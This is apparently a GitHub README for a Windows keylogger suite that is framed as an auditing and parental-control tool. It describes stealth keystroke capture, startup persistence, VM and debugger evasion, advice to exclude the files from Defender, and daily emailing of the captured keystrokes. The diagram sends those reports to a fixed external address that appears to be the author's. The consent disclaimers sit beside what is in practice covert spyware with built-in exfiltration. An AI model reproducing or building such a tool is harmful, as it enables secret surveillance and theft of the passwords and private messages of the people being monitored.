# Keylogger Suite - Advanced System Monitoring Toolkit

![GitHub last commit](https://img.shields.io/github/last-commit/elonmasai7/Keylogger_Suite)
![GitHub repo size](https://img.shields.io/github/repo-size/elonmasai7/Keylogger_Suite)
![License](https://img.shields.io/badge/License-MIT-blue)

## Overview
The Keylogger Suite is a comprehensive system monitoring solution designed for authorized security auditing and parental control purposes. This professional-grade toolkit provides advanced capabilities for system activity monitoring while maintaining a modular, easy-to-maintain architecture.

**Disclaimer**: This software is intended for educational purposes and legitimate monitoring activities only. Always obtain proper authorization before using on any system. Unauthorized use may violate privacy laws.

## Features

### Core Components
- **Keystroke Logging**: Capture all keyboard input with precise timestamps
- **Stealth Operation**: Runs invisibly in the background
- **Automatic Reports**: Generate daily PDF reports named after the host computer
- **Secure Delivery**: Encrypted email delivery via Gmail
- **Persistence**: Automatic startup installation
- **Self-Cleaning**: Comprehensive uninstallation script

### Advanced Capabilities
- **Anti-Analysis Techniques**: VM and debugger detection
- **Modular Design**: Independent components for easy maintenance
- **PDF Generation**: Professional report formatting
- **Email Encryption**: TLS-protected delivery
- **Cross-version Support**: Works on Windows 7 through 11

## Installation

### Requirements
- Windows 7 or newer
- MinGW compiler (for building from source)
- Gmail account with app password
- Administrator privileges (for installation)

### Setup Instructions
1. **Clone Repository**:
   ```bash
   git clone https://github.com/elonmasai7/Keylogger_Suite.git
   cd Keylogger_Suite
   ```

2. **Configure Email**:
   - Create app-specific password in Gmail:
     1. Go to https://myaccount.google.com/security
     2. Enable 2-Step Verification
     3. Generate app password
   - Update credentials in `SendEmail.cpp`:
     ```cpp
     $username = 'your_email@gmail.com';
     $password = 'your_app_password'; // Use generated app password
     ```

3. **Build Executables**:
   ```bash
   g++ src/Keylogger.cpp -o bin/Keylogger.exe -lws2_32 -O2 -s
   g++ src/RecordDecoder.cpp -o bin/RecordDecoder.exe -O2
   g++ src/CreatePDF.cpp -o bin/CreatePDF.exe -O2
   g++ src/SendEmail.cpp -o bin/SendEmail.exe -lcrypt32 -O2
   g++ src/Controller.cpp -o bin/Controller.exe -O2
   ```

4. **Install System**:
   Run as Administrator:
   ```bash
   Install.bat
   ```

## Technical Architecture

```mermaid
graph LR
    A[Keylogger] -->|Raw keystrokes| B[Record.log]
    C[Controller] -->|Daily trigger| D[Log Decoder]
    D -->|Processed data| E[Data.log]
    E --> F[PDF Generator]
    F -->|Formatted report| G([COMPUTERNAME]_Report.pdf])
    G --> H[Email Sender]
    H -->|Encrypted delivery| I[elonmasai02@proton.me]
```

## Usage

### Daily Operation
Once installed, the system operates automatically:
1. Keylogger captures input 24/7
2. Controller initiates daily at 12:00 AM:
   - Processes logs through decoder
   - Generates PDF report
   - Sends encrypted email
3. Logs rotate daily

### Manual Commands
- `CheckStatus.bat`: Verify running processes
- `ViewLogs.bat`: Access current logs (requires admin)
- `ForceSend.bat`: Trigger immediate report delivery
- `Remove.bat`: Uninstall completely

## Security Features

### Protection Mechanisms
- **Debugger Detection**: Uses `IsDebuggerPresent()` API
- **VM Detection**: Checks CPU hypervisor bit
- **Environment Validation**: Confirms legitimate Windows installations
- **Mutex Locking**: Prevents multiple instances
- **Exception Handling**: Crash prevention

### Email Security
- TLS 1.2 encryption
- App-specific passwords
- Base64-encoded attachments
- MIME-formatted messages

## Customization

### Configuration Options
1. **Email Settings**:
   - Update recipient in `SendEmail.cpp`
   - Modify SMTP server/port for different providers

2. **Schedule Timing**:
   Adjust in `Controller.cpp`:
   ```cpp
   // Change 86400 seconds (24 hours) to desired interval
   if((now - lastRun) > 86400) {
     // Daily tasks
   }
   ```

3. **Log Retention**:
   Modify in `Controller.cpp`:
   ```cpp
   // Add after email send:
   remove("%appdata%\\Record.log");
   remove("%appdata%\\Data.log");
   ```

## Uninstallation
Run as Administrator:
```bash
Uninstall.bat
```

This will:
1. Terminate running processes
2. Remove executables from AppData
3. Delete registry entry
4. Clean up log files

## Troubleshooting

### Common Issues
| Problem | Solution |
|---------|----------|
| Emails not sending | Verify app password/Gmail settings |
| PDF generation fails | Install .NET Framework 4.8+ |
| Defender deletes files | Add exclusion for install directory |
| Not persisting after reboot | Run Install.bat as Administrator |
| High CPU usage | Increase sleep interval in Keylogger.cpp |

## Legal and Ethical Considerations
- **Always obtain written consent** before monitoring any system
- Disclose monitoring to users where required by law
- Do not use for malicious purposes
- Securely store collected data
- Delete logs after authorized retention period

This software is provided "as-is" without warranties. Developers assume no liability for misuse.

## Support
For legitimate users with authorization:
- [Open an Issue](https://github.com/elonmasai7/Keylogger_Suite/issues)
- Security Reports: elonmasai@tutamail.com

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

**Ethical Reminder**: This toolkit should only be used on systems where you have explicit authorization. Unauthorized monitoring is illegal in most jurisdictions and violates fundamental privacy rights.
